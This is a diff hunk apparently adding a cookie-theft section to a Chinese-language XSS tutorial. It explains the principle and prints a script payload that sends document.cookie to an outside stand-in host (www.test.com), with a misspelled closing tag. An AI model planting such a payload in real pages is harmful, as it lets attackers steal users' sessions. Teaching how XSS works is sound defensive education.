@@ -42,6 +42,18 @@ XSS, 即为（Cross Site Scripting）, 中文名为跨站脚本, 是发生在目
 
 (1)cookie 盗取
 
+原理：
+  
+在一个具有存储型xss(或者反射型)的网站里，攻击者就可以向漏洞页面写入可以窃取cookie的恶意代码，当用户浏览页面时，攻击者就能获取用户浏览器中的cookie信息。
+
+攻击者可以用以下几种方式窃取cookie信息：
+
+```html
+<script>document.location="http://www.test.com/cookie.asp?cookie="+document.cookie</srcipt>
+
+```
+
+
 
 
 
